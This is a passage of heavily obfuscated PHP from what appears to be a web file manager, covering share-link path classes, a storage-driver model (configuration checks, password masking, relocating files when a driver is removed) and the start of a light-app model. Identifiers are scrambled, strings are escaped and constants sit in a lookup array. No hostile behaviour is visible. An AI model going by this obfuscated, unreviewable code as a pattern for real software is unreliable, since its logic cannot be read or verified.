get_path_this($this->pathParse[$_SERVER[¤øïŠ‹²][98]]); } public function pathFather($Ù»·ŸÊ­) { return get_path_father($this->pathParse[$_SERVER[¤øïŠ‹²][98]]); } public function iconvSystem($²ùÕˆŸŒ) { return $²ùÕˆŸŒ; } protected function infoParse($½°Ä“µ, $¯ƒ»¬õ¶ = false) { $ó³Ö¿Ã­ =& $_SERVER[¤øïŠ‹²]; $¸’ÎÛÖ = $this->pathParse[$ó³Ö¿Ã­[582]][$ó³Ö¿Ã­[589]] . $this->pathParse[$ó³Ö¿Ã­[1302]]; if ($¯ƒ»¬õ¶) { $¾ŒÛ®«õ = IO::infoWithChildren($¸’ÎÛÖ); } else { $¾ŒÛ®«õ = IO::info($¸’ÎÛÖ); } $¬¶Ùì²£ = $this->pathParse[$ó³Ö¿Ã­[582]]; return Action($ó³Ö¿Ã­[1489])->_shareItemeParse($¾ŒÛ®«õ, $¬¶Ùì²£); } public function listAll($ÖÂ¿µØ) { $¶­º—æ» =& $_SERVER[¤øïŠ‹²]; $çû¯Ÿú” = IO::listAll($ÖÂ¿µØ); $õª¼ Ü– = rtrim($this->pathParse[$¶­º—æ»[582]][$¶­º—æ»[589]], $¶­º—æ»[8]); foreach ($çû¯Ÿú” as &$ŒïËâ‘) { $ŒïËâ‘[$¶­º—æ»[98]] = $this->pathDriver . $¶­º—æ»[8] . ltrim(substr($ŒïËâ‘[$¶­º—æ»[98]], strlen($õª¼ Ü–)), $¶­º—æ»[8]); } unset($ŒïËâ‘); return $çû¯Ÿú”; } public function listAllSimple($İ’ªØ¼‘, $¯ÛÄ×…Ø = false) { $ëœÓøùÀ =& $_SERVER[¤øïŠ‹²]; $Ìëø¬ô = $this->listAll($İ’ªØ¼‘); $À…ÃĞüÔ = $this->pathParse[$ëœÓøùÀ[516]]; if (trim($À…ÃĞüÔ, $ëœÓøùÀ[8]) == trim(get_path_father($À…ÃĞüÔ), $ëœÓøùÀ[8])) { $¯ÛÄ×…Ø = !0; } return IO::init($ëœÓøùÀ[12])->listAllSimpleMake($Ìëø¬ô, $À…ÃĞüÔ, $¯ÛÄ×…Ø); } public function getPathOuter($§¡Ô–‡¿) { $ëæò—ı… =& $_SERVER[¤øïŠ‹²]; $›Ø€—µ© = KodIO::parse($§¡Ô–‡¿); if ($›Ø€—µ©[$ëæò—ı…[33]] == KodIO::KOD_SHARE_ITEM) { return $›Ø€—µ©[$ëæò—ı…[98]]; } $¸¬ÂÕî = KodIO::clear($§¡Ô–‡¿); $¿ÓšÚò™ = KodIO::clear($this->pathParse[$ëæò—ı…[582]][$ëæò—ı…[589]]); $§”ĞŞ¥„ = substr($¸¬ÂÕî, strlen($¿ÓšÚò™)); if (substr($¸¬ÂÕî, 0, strlen($¿ÓšÚò™)) != $¿ÓšÚò™) { return !1; } return $this->pathParse[$ëæò—ı…[1303]] . $ëæò—ı…[8] . ltrim($§”ĞŞ¥„, $ëæò—ı…[8]); } public function getType() { $€ ÏšÚ‚ =& $_SERVER[¤øïŠ‹²]; $ªå¨ëü¼ = str_replace($€ ÏšÚ‚[88], $€ ÏšÚ‚[12], get_class($this)); return strtolower($ªå¨ëü¼); } public function isOsDriver($İÂŠû™Œ) { return IO::isOsDriver($İÂŠû™Œ); } public function info($¦Ğ¡ØÆ˜) { return $this->infoParse($¦Ğ¡ØÆ˜); } public function infoAuth($ö›¿“) { return $this->infoParse($ö›¿“); } public function infoWithChildren($¥üŞÇ¢) { return $this->infoParse($¥üŞÇ¢, !0); } public function infoFull($“î†‹´Ù) { return $this->infoParse($“î†‹´Ù); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($Ã°ú³Æ³) { $this->pathParse = $Ã°ú³Æ³; } protected function infoParse($„—¾¿ µ, $èƒï²ëà = false) { $Æ¸…“” =& $_SERVER[¤øïŠ‹²]; return Action($Æ¸…“”[1309])->sharePathInfo($this->pathParse[$Æ¸…“”[98]], !0, $èƒï²ëà); } public function listPath($„ÄÂ²©, $‡ä­€‡® = false) { $Ô‰ŒøÅÉ =& $_SERVER[¤øïŠ‹²]; $ÎÉØÔ„Ê = IO::listPath($„ÄÂ²©, $‡ä­€‡®); if (!$ÎÉØÔ„Ê) { return $ÎÉØÔ„Ê; } if (is_array($ÎÉØÔ„Ê[$Ô‰ŒøÅÉ[1490]])) { $ì¬¼©ğø = Action($Ô‰ŒøÅÉ[1499])->parsePathChildren($ÎÉØÔ„Ê[$Ô‰ŒøÅÉ[1490]], array($Ô‰ŒøÅÉ[516] => $„ÄÂ²©)); $ÎÉØÔ„Ê[$Ô‰ŒøÅÉ[1490]] = Action($Ô‰ŒøÅÉ[1309])->shareItemInfo($ì¬¼©ğø); } foreach ($ÎÉØÔ„Ê as $æâÅÎòù => $´Æ™ê³ú) { if (!in_array($æâÅÎòù, array($Ô‰ŒøÅÉ[97], $Ô‰ŒøÅÉ[96]))) { continue; } foreach ($´Æ™ê³ú as $’ñ¿¾¶í => $ì¬¼©ğø) { $ì¬¼©ğø = Action($Ô‰ŒøÅÉ[1499])->parsePathChildren($ì¬¼©ğø, array($Ô‰ŒøÅÉ[516] => $„ÄÂ²©)); $ÎÉØÔ„Ê[$æâÅÎòù][$’ñ¿¾¶í] = Action($Ô‰ŒøÅÉ[1309])->shareItemInfo($ì¬¼©ğø); } } return $ÎÉØÔ„Ê; } } goto F³Ê‚öÂØÎ; Cö“µ¥“æŒ: class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x73\x74\x6f\x72\x61\147\x65\x4c\151\163\164"; public $field = array("\x6e\141\155\x65", "\x73\151\172\x65\115\141\170", "\163\171\x73\x74\x65\x6d", "\144\145\x66\141\165\x6c\164", "\144\162\x69\166\145\x72", "\x63\157\x6e\x66\151\x67"); public function listData($·ã‡éÚ¾ = false, $íÜÆ˜¨ò = "\155\x6f\x64\x69\x66\x79\x54\x69\155\x65", $ĞùõÏ‹Ú = false) { $êıµßöÙ =& $_SERVER[¤øïŠ‹²]; $òÏˆ–Â = parent::listData($·ã‡éÚ¾, $íÜÆ˜¨ò, $ĞùõÏ‹Ú); if ($·ã‡éÚ¾) { return $òÏˆ–Â; } $‚Ğ˜³ÁÚ = array(); if ($GLOBALS[$êıµßöÙ[2467]]) { $‚Ğ˜³ÁÚ = $this->ioSizeUseGet(array_to_keyvalue($òÏˆ–Â, $êıµßöÙ[12], $êıµßöÙ[493])); } foreach ($òÏˆ–Â as $…¤«…¨û => $ìºïÅ‡) { unset($òÏˆ–Â[$…¤«…¨û][$êıµßöÙ[6]]); $òÏˆ–Â[$…¤«…¨û][$êıµßöÙ[2120]] = isset($‚Ğ˜³ÁÚ[$ìºïÅ‡[$êıµßöÙ[493]]]) ? $‚Ğ˜³ÁÚ[$ìºïÅ‡[$êıµßöÙ[493]]] : 0; } return $òÏˆ–Â; } public function ioSizeUseGet($€­İ¢Øı) { $‰øÄ×¸² =& $_SERVER[¤øïŠ‹²]; if (!$€­İ¢Øı) { return array(); } $‹¾ªÁß = $‰øÄ×¸²[2468] . implode($‰øÄ×¸²[50], $€­İ¢Øı); $¸÷‹ŒÅË = Cache::get($‹¾ªÁß); if ($¸÷‹ŒÅË) { return $¸÷‹ŒÅË; } $ÌõØÎ« = array($‰øÄ×¸²[927] => $‰øÄ×¸²[493], $‰øÄ×¸²[2469] => $‰øÄ×¸²[90]); $²®ä·µÍ = array($‰øÄ×¸²[927] => array($‰øÄ×¸²[7], $€­İ¢Øı)); $¸÷‹ŒÅË = Model($‰øÄ×¸²[895])->field($ÌõØÎ«)->where($²®ä·µÍ)->group($‰øÄ×¸²[927])->select(); $¸÷‹ŒÅË = array_to_keyvalue($¸÷‹ŒÅË, $‰øÄ×¸²[493], $‰øÄ×¸²[90]); Cache::set($‹¾ªÁß, $¸÷‹ŒÅË, 600); return $¸÷‹ŒÅË; } public function getConfig($áÍéŞõ) { $Ò÷Š¦ğò = parent::listData($áÍéŞõ); $Í´¨ƒ• = _get($Ò÷Š¦ğò, $_SERVER[¤øïŠ‹²][6], array()); if ($Í´¨ƒ• && !is_array($Í´¨ƒ•)) { $Í´¨ƒ• = json_decode($Í´¨ƒ•, !0); } return $Í´¨ƒ•; } public function update($–»é¸íİ, $×ˆ§ì¿²) { $‰•ÊÙıÔ =& $_SERVER[¤øïŠ‹²]; $ŞÎ•Íîû = $×ˆ§ì¿²[$‰•ÊÙıÔ[32]]; $¦²À‘‘Ä = array_to_keyvalue(parent::listData(), $‰•ÊÙıÔ[32]); if (isset($¦²À‘‘Ä[$ŞÎ•Íîû]) && $¦²À‘‘Ä[$ŞÎ•Íîû][$‰•ÊÙıÔ[493]] != $–»é¸íİ) { return !1; } $this->checkPwd($–»é¸íİ, $×ˆ§ì¿²); if (isset($×ˆ§ì¿²[$‰•ÊÙıÔ[2470]]) && $×ˆ§ì¿²[$‰•ÊÙıÔ[2470]] == $‰•ÊÙıÔ[102]) { $this->checkConfig($×ˆ§ì¿²); } unset($×ˆ§ì¿²[$‰•ÊÙıÔ[2470]]); $Òïõ¤Èï = parent::update($–»é¸íİ, $×ˆ§ì¿²); if ($Òïõ¤Èï && $×ˆ§ì¿²[$‰•ÊÙıÔ[37]]) { foreach ($¦²À‘‘Ä as $Ç—œ”à™) { if ($Ç—œ”à™[$‰•ÊÙıÔ[37]] && $Ç—œ”à™[$‰•ÊÙıÔ[493]] != $–»é¸íİ) { parent::update($Ç—œ”à™[$‰•ÊÙıÔ[493]], array($‰•ÊÙıÔ[37] => 0)); } } $this->updateBackup($–»é¸íİ, $¦²À‘‘Ä); } return $Òïõ¤Èï; } public function add($Ä…æíš) { $ç·ç”ûŒ =& $_SERVER[¤øïŠ‹²]; $ÊÔ§Üƒ‰ = array_to_keyvalue(parent::listData(), $ç·ç”ûŒ[32]); if (isset($ÊÔ§Üƒ‰[$Ä…æíš[$ç·ç”ûŒ[32]]])) { return !1; } $this->checkConfig($Ä…æíš); $ÇÍ©Â·» = parent::insert($Ä…æíš); if ($ÇÍ©Â·» && $Ä…æíš[$ç·ç”ûŒ[37]]) { foreach ($ÊÔ§Üƒ‰ as $âÕûîˆÁ) { if ($âÕûîˆÁ[$ç·ç”ûŒ[37]]) { parent::update($âÕûîˆÁ[$ç·ç”ûŒ[493]], array($ç·ç”ûŒ[37] => 0)); } } $this->updateBackup($ÇÍ©Â·», $ÊÔ§Üƒ‰); } return $ÇÍ©Â·»; } public function updateBackup($÷…±•ì, $¿é¯ éß) { $İÎ¬ŸìĞ =& $_SERVER[¤øïŠ‹²]; if ($÷…±•ì == $İÎ¬ŸìĞ[102]) { return; } $‰£ßÂ = Model($İÎ¬ŸìĞ[849])->config(); $´ì«à © = $‰£ßÂ[$İÎ¬ŸìĞ[853]]; if ($‰£ßÂ[$İÎ¬ŸìĞ[1895]] != $İÎ¬ŸìĞ[102] || $´ì«à © == $÷…±•ì) { return; } if ($´ì«à © != $İÎ¬ŸìĞ[102]) { $Ùå ŒŠÕ = array(); foreach ($¿é¯ éß as $éÃŞ¿¦) { if ($÷…±•ì == $éÃŞ¿¦[$İÎ¬ŸìĞ[493]]) { continue; } $Ùå ŒŠÕ[] = $éÃŞ¿¦[$İÎ¬ŸìĞ[493]]; } if ($Ùå ŒŠÕ && in_array($´ì«à ©, $Ùå ŒŠÕ)) { return; } } $µ“ô¥Ó„ = Model($İÎ¬ŸìĞ[874])->get($İÎ¬ŸìĞ[881]); $µ“ô¥Ó„ = json_decode($µ“ô¥Ó„, !0); if (!$µ“ô¥Ó„) { return; } $µ“ô¥Ó„[$İÎ¬ŸìĞ[853]] = $÷…±•ì; Model($İÎ¬ŸìĞ[874])->set(array($İÎ¬ŸìĞ[881] => $µ“ô¥Ó„)); } public function checkPwd($œæĞ¶‹ù, &$ğ¿Œ„È™) { $Ãğ‰ûÌŒ =& $_SERVER[¤øïŠ‹²]; if (empty($ğ¿Œ„È™[$Ãğ‰ûÌŒ[6]])) { return; } $ÛîéØ¶ = $ğ¿Œ„È™[$Ãğ‰ûÌŒ[6]]; if (!is_array($ÛîéØ¶)) { $ÛîéØ¶ = json_decode($ÛîéØ¶, !0); } $§ê£Å÷Û = $Ãğ‰ûÌŒ[12]; $”Åı“‚¢ = array($Ãğ‰ûÌŒ[1590], $Ãğ‰ûÌŒ[2471], $Ãğ‰ûÌŒ[1002]); foreach ($”Åı“‚¢ as $“ÎÕèÛ¥) { if (isset($ÛîéØ¶[$“ÎÕèÛ¥])) { $§ê£Å÷Û = $“ÎÕèÛ¥; break; } } if (!$§ê£Å÷Û) { return; } $³¼£“çó = $this->getConfig($œæĞ¶‹ù); $ŞÎ±˜È­ = $³¼£“çó[$§ê£Å÷Û]; $Œê±‰« = $ÛîéØ¶[$§ê£Å÷Û]; if ($Œê±‰« == str_repeat($Ãğ‰ûÌŒ[233], strlen($ŞÎ±˜È­))) { $ÛîéØ¶[$§ê£Å÷Û] = $ŞÎ±˜È­; $ğ¿Œ„È™[$Ãğ‰ûÌŒ[6]] = json_encode($ÛîéØ¶); } else { if ($Œê±‰« != $ŞÎ±˜È­) { $ğ¿Œ„È™[$Ãğ‰ûÌŒ[2470]] = $Ãğ‰ûÌŒ[102]; } } } public function checkConfig(&$ÅÚ¹ºî†, $²û“ø¼ = false) { $ı¤»éÍÄ =& $_SERVER[¤øïŠ‹²]; $§Î—şšè = strtolower($ÅÚ¹ºî†[$ı¤»éÍÄ[107]]); $†İ¡é… = $ÅÚ¹ºî†[$ı¤»éÍÄ[6]]; if (!is_array($†İ¡é…)) { $†İ¡é… = json_decode($†İ¡é…, !0); } foreach ($†İ¡é… as $’¢ÏÈÌ” => $¼ÄÍÕ©Ö) { if (is_string($¼ÄÍÕ©Ö)) { $†İ¡é…[$’¢ÏÈÌ”] = trim($¼ÄÍÕ©Ö); } } $†İ¡é…[$ı¤»éÍÄ[2472]] = rand_string(6); $Ú¤Ğâ¨é = $GLOBALS[$ı¤»éÍÄ[6]][$ı¤»éÍÄ[103]][$ı¤»éÍÄ[935]]; $¢¯ş¼µ‘ = isset($Ú¤Ğâ¨é[$§Î—şšè]) ? $Ú¤Ğâ¨é[$§Î—şšè] : ucfirst($§Î—şšè); $Û–şíÍâ = $ı¤»éÍÄ[88] . $¢¯ş¼µ‘; if (!$¢¯ş¼µ‘ || !class_exists($Û–şíÍâ)) { if ($²û“ø¼) { return LNG($ı¤»éÍÄ[2473]); } write_log(array($ı¤»éÍÄ[2474], $ÅÚ¹ºî†, get_caller_info()), $ı¤»éÍÄ[226]); show_json(LNG($ı¤»éÍÄ[2473]), !1, $ÅÚ¹ºî†); } $‡ğã‚÷­ = new $Û–şíÍâ($†İ¡é…); $¶¹ŒË×Ë = rtrim($†İ¡é…[$ı¤»éÍÄ[1315]], $ı¤»éÍÄ[8]) . $ı¤»éÍÄ[8]; if (in_array($§Î—şšè, $‡ğã‚÷­->objectDriver)) { try { if (!$‡ğã‚÷­->isBucketCors() && !$‡ğã‚÷­->setBucketCors()) { $Ø®ö¥·Ñ = LNG($ı¤»éÍÄ[2475]); $Ø®ö¥·Ñ .= $ı¤»éÍÄ[2476] . LNG($ı¤»éÍÄ[2477]); } } catch (Exception $îÁ½‹Ø¶) { $Ø®ö¥·Ñ = $îÁ½‹Ø¶->getMessage(); } if (isset($Ø®ö¥·Ñ)) { return $this->_parseError($Ø®ö¥·Ñ, $§Î—şšè, $²û“ø¼); } if ($§Î—şšè == $ı¤»éÍÄ[79] && !$‡ğã‚÷­->checkRegion()) { return $this->_parseError(LNG($ı¤»éÍÄ[2478]), $§Î—şšè, $²û“ø¼); } } else { if ($§Î—şšè == $ı¤»éÍÄ[2479]) { if ($‡ğã‚÷­->ftpPath) { $à×ôù„› = trim($¶¹ŒË×Ë, $ı¤»éÍÄ[8]); if (stripos($à×ôù„›, trim($‡ğã‚÷­->ftpPath, $ı¤»éÍÄ[8])) !== 0) { $¶¹ŒË×Ë = $‡ğã‚÷­->ftpPath . $ı¤»éÍÄ[8] . ($à×ôù„› ? $à×ôù„› . $ı¤»éÍÄ[8] : $ı¤»éÍÄ[12]); } } } } $Á‰“õ‹İ = $‡ğã‚÷­->getPath($¶¹ŒË×Ë . $ı¤»éÍÄ[1319]); try { if ($§Î—şšè == $ı¤»éÍÄ[118]) { $‡ğã‚÷­->mkdir($¶¹ŒË×Ë); } $“«ßŠ¢ = $‡ğã‚÷­->mkfile($Á‰“õ‹İ); if (!$“«ßŠ¢) { $Ø®ö¥·Ñ = LNG($ı¤»éÍÄ[2475]); } } catch (Exception $îÁ½‹Ø¶) { $Ø®ö¥·Ñ = $îÁ½‹Ø¶->getMessage(); } if (isset($Ø®ö¥·Ñ)) { return $this->_parseError($Ø®ö¥·Ñ, $§Î—şšè, $²û“ø¼); } $†İ¡é…[$ı¤»éÍÄ[1315]] = $¶¹ŒË×Ë; $ÅÚ¹ºî†[$ı¤»éÍÄ[6]] = json_encode($†İ¡é…); $ÅÚ¹ºî†[$ı¤»éÍÄ[107]] = $¢¯ş¼µ‘; return !0; } private function _parseError($¯îÕêÍ, $‚†€òı‡, $Šæªƒª« = false) { $ˆ“ëß× =& $_SERVER[¤øïŠ‹²]; if ($‚†€òı‡ == $ˆ“ëß×[79] && stripos($¯îÕêÍ, $ˆ“ëß×[2480])) { $úÉåŠçš = explode($ˆ“ëß×[10], $¯îÕêÍ); $ïêû—Ğ = isset($úÉåŠçš[1]) ? $úÉåŠçš[1] : $ˆ“ëß×[12]; $‡‰¿¸ = array($ˆ“ëß×[2481] => LNG($ˆ“ëß×[2482]), $ˆ“ëß×[2483] => LNG($ˆ“ëß×[2484])); if (isset($‡‰¿¸[$ïêû—Ğ])) { $¯îÕêÍ = $‡‰¿¸[$ïêû—Ğ]; } } if (stripos($¯îÕêÍ, $ˆ“ëß×[2485]) === 0) { $çİ‚÷¦ = strpos($¯îÕêÍ, $ˆ“ëß×[188]); if ($çİ‚÷¦ === !1) { $çİ‚÷¦ = strpos($¯îÕêÍ, $ˆ“ëß×[4]); } if ($çİ‚÷¦ !== !1) { $¯îÕêÍ = substr($¯îÕêÍ, $çİ‚÷¦ + 1); } } $¯îÕêÍ = LNG($ˆ“ëß×[1322]) . $¯îÕêÍ; if ($Šæªƒª«) { return $¯îÕêÍ; } show_json($¯îÕêÍ, !1); } public function driverListSystem() { $ß¬¹®´á =& $_SERVER[¤øïŠ‹²]; $íœ¾Ã‹ş = parent::listData(); $×Ê¾ôû = array(); foreach ($íœ¾Ã‹ş as $ßæ˜ÊÁâ) { unset($ßæ˜ÊÁâ[$ß¬¹®´á[244]], $ßæ˜ÊÁâ[$ß¬¹®´á[99]]); if (!is_array($ßæ˜ÊÁâ[$ß¬¹®´á[6]])) { $ßæ˜ÊÁâ[$ß¬¹®´á[6]] = json_decode($ßæ˜ÊÁâ[$ß¬¹®´á[6]], !0); } $×Ê¾ôû[] = $ßæ˜ÊÁâ; } return $×Ê¾ôû; } public function defaultDriver() { $”§Õö³î =& $_SERVER[¤øïŠ‹²]; $ŸäÄ²×« = parent::listData(); $§Ê“³¨² = array_filter_by_field($ŸäÄ²×«, $”§Õö³î[37], 1); $§Ê“³¨² = $§Ê“³¨²[0]; if (!$§Ê“³¨²) { return array(); } if (!is_array($§Ê“³¨²[$”§Õö³î[6]])) { $§Ê“³¨²[$”§Õö³î[6]] = json_decode($§Ê“³¨²[$”§Õö³î[6]], !0); } return $§Ê“³¨²; } public function driverInfo($‡¯«ì¤§) { $¤«€¹¾™ =& $_SERVER[¤øïŠ‹²]; $“É¯ıŸÑ = array_to_keyvalue(parent::listData(), $¤«€¹¾™[493]); if (!isset($“É¯ıŸÑ[$‡¯«ì¤§])) { return !1; } $Úù»ï¬ğ = $“É¯ıŸÑ[$‡¯«ì¤§]; if (!is_array($Úù»ï¬ğ[$¤«€¹¾™[6]])) { $Úù»ï¬ğ[$¤«€¹¾™[6]] = json_decode($Úù»ï¬ğ[$¤«€¹¾™[6]], !0); } return $Úù»ï¬ğ; } public function remove($ê‰ºØ¦è) { $this->removeShareItems($ê‰ºØ¦è); return parent::remove($ê‰ºØ¦è); } public function removeWithFile($»©™»¾É, $œúşÑèØ, $Œü™ÁÏä, $İ€úâ¤ó = false) { $¿ªˆŸĞ =& $_SERVER[¤øïŠ‹²]; ignore_timeout(); $øÅ¨ùšÍ = array($¿ªˆŸĞ[927] => $»©™»¾É); $ç÷¨ˆÍ“ = Model($¿ªˆŸĞ[566]); if (isset($GLOBALS[$¿ªˆŸĞ[2486]])) { $–‡¯³Ú³ = $GLOBALS[$¿ªˆŸĞ[2486]]; } else { $–‡¯³Ú³ = $ç÷¨ˆÍ“->where($øÅ¨ùšÍ)->field(array($¿ªˆŸĞ[2382] => $¿ªˆŸĞ[2087], $¿ªˆŸĞ[2458] => $¿ªˆŸĞ[90]))->find(); } $¸à¤ì¢ = intval($–‡¯³Ú³[$¿ªˆŸĞ[2087]]); $÷Ãğ²í = intval($–‡¯³Ú³[$¿ªˆŸĞ[90]]); $ò¤­ËÚ™ = $œúşÑèØ . $¿ªˆŸĞ[2487] . $»©™»¾É; $ëµñ«Â³ = LNG($œúşÑèØ == $¿ªˆŸĞ[649] ? $¿ªˆŸĞ[2488] : $¿ªˆŸĞ[2489]); $Ì×šÌ³¡ = new TaskFileTransfer($ò¤­ËÚ™, $¿ªˆŸĞ[226], $¸à¤ì¢, $ëµñ«Â³ . $¿ªˆŸĞ[483] . $Œü™ÁÏä[$¿ªˆŸĞ[32]] . $¿ªˆŸĞ[225] . $»©™»¾É); $Ì×šÌ³¡->task[$¿ªˆŸĞ[865]] = (double) $÷Ãğ²í; $Şû„³ã­ = KodIO::defaultDriver(); $­È¶Ö¶ƒ = $Şû„³ã­[$¿ªˆŸĞ[493]]; $ÊÕıåúò = 1; $øòü§óö = 5000; $Šù³Çıó = $ƒ‹‹‡Ş– = $íÊà©Ò = array(); $§â«é¸² = $ç÷¨ˆÍ“->where($øÅ¨ùšÍ)->field($¿ªˆŸĞ[2490])->selectPage($øòü§óö, $ÊÕıåúò); $“Ş¹†·İ = intval($§â«é¸²[$¿ªˆŸĞ[454]][$¿ªˆŸĞ[456]]); while ($§â«é¸² && $ÊÕıåúò <= $“Ş¹†·İ) { foreach ($§â«é¸²[$¿ªˆŸĞ[457]] as $úç–ãÃ) { $¨¼ÂÛÌÒ = $úç–ãÃ[$¿ªˆŸĞ[563]]; if ($İ€úâ¤ó) { $ƒ‹‹‡Ş–[] = $¨¼ÂÛÌÒ; continue; } $‡€ŞÓ–Œ = $úç–ãÃ[$¿ªˆŸĞ[98]]; $Õ¦™è  = get_path_father($‡€ŞÓ–Œ); $íÊà©Ò[] = $Õ¦™è ; $Õ¦™è  = str_replace("\173\x69\157\72{$»©™»¾É}\x7d\57", "\173\x69\x6f\x3a{$­È¶Ö¶ƒ}\175\57", $Õ¦™è ); if (!IO::exist($‡€ŞÓ–Œ)) { $Šù³Çıó[] = $¨¼ÂÛÌÒ; $Ì×šÌ³¡->updateFileEnd($úç–ãÃ[$¿ªˆŸĞ[32]], $úç–ãÃ[$¿ªˆŸĞ[90]]); write_log($¿ªˆŸĞ[2491] . $‡€ŞÓ–Œ, $¿ªˆŸĞ[2066]); continue; } $ü²Äš›ì = IO::move($‡€ŞÓ–Œ, $Õ¦™è , REPEAT_RENAME); if (!$ü²Äš›ì) { $ƒ‹‹‡Ş–[] = $¨¼ÂÛÌÒ; $Ì×šÌ³¡->updateFileEnd($úç–ãÃ[$¿ªˆŸĞ[32]], $úç–ãÃ[$¿ªˆŸĞ[90]]); write_log($¿ªˆŸĞ[2492] . $‡€ŞÓ–Œ, $¿ªˆŸĞ[2066]); continue; } $ŒùºĞÌˆ = array($¿ªˆŸĞ[927] => $­È¶Ö¶ƒ, $¿ªˆŸĞ[98] => $ü²Äš›ì); $ç÷¨ˆÍ“->where(array($¿ªˆŸĞ[563] => $¨¼ÂÛÌÒ))->save($ŒùºĞÌˆ); } $ÊÕıåúò++; $§â«é¸² = $ç÷¨ˆÍ“->where($øÅ¨ùšÍ)->field($¿ªˆŸĞ[2490])->selectPage($øòü§óö, $ÊÕıåúò); } $Æà¨ØŒÍ = $Ì×šÌ³¡->task; if (!$İ€úâ¤ó) { Cache::set($ò¤­ËÚ™, $Æà¨ØŒÍ); } $Ì×šÌ³¡->end(); $Šù³Çıó = array_unique($Šù³Çıó); $ƒ‹‹‡Ş– = array_unique($ƒ‹‹‡Ş–); if (!$İ€úâ¤ó && ($Šù³Çıó || $ƒ‹‹‡Ş–)) { $Ü¢»æ³ = array(); if ($Šù³Çıó) { $Ü¢»æ³[] = sprintf(LNG($¿ªˆŸĞ[2493]), count($Šù³Çıó)); } if ($ƒ‹‹‡Ş–) { $Ü¢»æ³[] = sprintf(LNG($¿ªˆŸĞ[2494]), count($ƒ‹‹‡Ş–)); } $Ü¢»æ³ = sprintf(LNG($¿ªˆŸĞ[2495]), implode($¿ªˆŸĞ[1536], $Ü¢»æ³)) . $¿ªˆŸĞ[2496] . date($¿ªˆŸĞ[2497]) . $¿ªˆŸĞ[2498]; if ($œúşÑèØ == $¿ªˆŸĞ[1280]) { $Ü¢»æ³ .= $¿ªˆŸĞ[2499] . LNG($¿ªˆŸĞ[2500]); } else { $Ü¢»æ³ = LNG($¿ªˆŸĞ[2501]) . $¿ªˆŸĞ[2502] . $Ü¢»æ³; } $Æà¨ØŒÍ[$¿ªˆŸĞ[1317]] = $Ü¢»æ³; Cache::set($ò¤­ËÚ™, $Æà¨ØŒÍ); unset($Œü™ÁÏä[$¿ªˆŸĞ[6]]); $º¬ƒ÷» = array($¿ªˆŸĞ[493] => $»©™»¾É, $¿ªˆŸĞ[2371] => $¿ªˆŸĞ[649], $¿ªˆŸĞ[32] => $Œü™ÁÏä[$¿ªˆŸĞ[32]], $¿ªˆŸĞ[107] => $Œü™ÁÏä[$¿ªˆŸĞ[107]]); Hook::trigger($¿ªˆŸĞ[1935], array($¿ªˆŸĞ[1339] => $º¬ƒ÷», $¿ªˆŸĞ[1349] => !0)); show_json($Ü¢»æ³, !1, 100111); } if ($œúşÑèØ == $¿ªˆŸĞ[649]) { return !0; } if ($Šù³Çıó || $ƒ‹‹‡Ş–) { $†×œ¯À› = array_merge($Šù³Çıó, $ƒ‹‹‡Ş–); $†×œ¯À› = array_filter(array_unique($†×œ¯À›)); $this->removeByFileID($†×œ¯À›); } if ($íÊà©Ò) { $íÊà©Ò = array_filter(array_unique($íÊà©Ò)); foreach ($íÊà©Ò as $‡€ŞÓ–Œ) { $–‡¯³Ú³ = IO::has($‡€ŞÓ–Œ, !0); if (!$–‡¯³Ú³[$¿ªˆŸĞ[252]] && !$–‡¯³Ú³[$¿ªˆŸĞ[253]]) { IO::remove($‡€ŞÓ–Œ); } } } return $this->remove($»©™»¾É); } private function removeByFileID($Ù ‚ï° = array()) { $ñä¾…ã› =& $_SERVER[¤øïŠ‹²]; if (empty($Ù ‚ï°)) { return; } $¶¯¤º³Ú = array($ñä¾…ã›[563] => array($ñä¾…ã›[7], $Ù ‚ï°)); $ïÀªÄ¾î = Model($ñä¾…ã›[1482])->where($¶¯¤º³Ú)->field($ñä¾…ã›[2447])->select(); if (!$ïÀªÄ¾î) { return Model($ñä¾…ã›[566])->remove($Ù ‚ï°); } $ïÀªÄ¾î = array_to_keyvalue($ïÀªÄ¾î, $ñä¾…ã›[204], $ñä¾…ã›[563]); foreach ($ïÀªÄ¾î as $Ó¬”£—Ü => $ÄÙÜª´š) { Model($ñä¾…ã›[934])->removeNow($Ó¬”£—Ü, !1); } $²·ßî ¥ = array_diff($Ù ‚ï°, array_unique(array_values($ïÀªÄ¾î))); if ($²·ßî ¥) { return Model($ñä¾…ã›[566])->remove($²·ßî ¥); } } private function removeShareItems($ˆ³‘µíÉ) { $Ğ÷¯îœ =& $_SERVER[¤øïŠ‹²]; $ÌÀÎÃÆ  = "\173\151\157\72{$ˆ³‘µíÉ}\x7d\x2f"; $®í £ü = array($Ğ÷¯îœ[204] => 0, $Ğ÷¯îœ[589] => array($Ğ÷¯îœ[480], "{$ÌÀÎÃÆ }\45")); $ÙÆ©‹÷ = Model($Ğ÷¯îœ[1512])->where($®í £ü)->field($Ğ÷¯îœ[694])->select(); if (empty($ÙÆ©‹÷)) { return; } $ôÎû¶Ğö = array_to_keyvalue($ÙÆ©‹÷, $Ğ÷¯îœ[12], $Ğ÷¯îœ[694]); Model($Ğ÷¯îœ[693])->remove($ôÎû¶Ğö); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\114\151\x67\x68\x74\x41\x70\160"; public $modelType = "\123\x79\163\164\145\155\x4f\x70\x74\151\x6f\156"; public $field = array("\x6e\141\x6d\145", "\x67\162\157\165\160", "\x64\145\x73\x63", "\x63\x6f\156\164\x65\x6e\164"); public function listData($‚ıœĞñÅ = false, $¾Ï¯˜´ = "\155\x6f\144\151\x66\x79\x54\151\155\145", $ˆùÕà˜™ = true) { return parent::listData($‚ıœĞñÅ, $¾Ï¯˜´, $ˆùÕà˜™); } public function remove($¯ŠöğÖ«) { $ŞíìÕº‹ = $this->findByName($¯ŠöğÖ«); if (!$ŞíìÕº‹) { return !1; } return parent::remove($ŞíìÕº‹[$_SERVER[¤øïŠ‹²][493]]); } public function add($Äòİ¬Ÿ¾) { if ($this->findByName($Äòİ¬Ÿ¾[$_SERVER[¤øïŠ‹²][32]])) { return !1; } return parent::insert($Äòİ¬Ÿ¾); } public function update($˜ÂÛèøü, $½†íö¶Ü) { $îÆï”È± =& $_SERVER[¤øïŠ‹²]; $ù”Â¹‰Ö = $this->findByName($˜ÂÛèøü); $ªĞãÕ´Û = $this->findByName($½†íö¶Ü[$îÆï”È±[32]]); if (!$ù”Â¹‰Ö || $ªĞãÕ´Û 